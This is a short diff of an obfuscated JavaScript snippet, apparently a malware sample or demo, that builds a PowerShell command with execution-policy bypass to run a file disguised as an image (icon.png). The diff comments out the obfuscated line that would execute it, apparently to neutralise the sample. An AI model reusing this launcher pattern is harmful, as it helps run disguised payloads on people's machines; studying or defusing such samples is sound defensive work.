@@ -28,4 +28,4 @@ var tdurot = "run";
 
 
 var command = "PowerShell -ex Bypass C:\\demo\\icon.png param1";
-cqorobcit[tdurot](command, 1); // evidence
+// LGV cqorobcit[tdurot](command, 1); // evidence
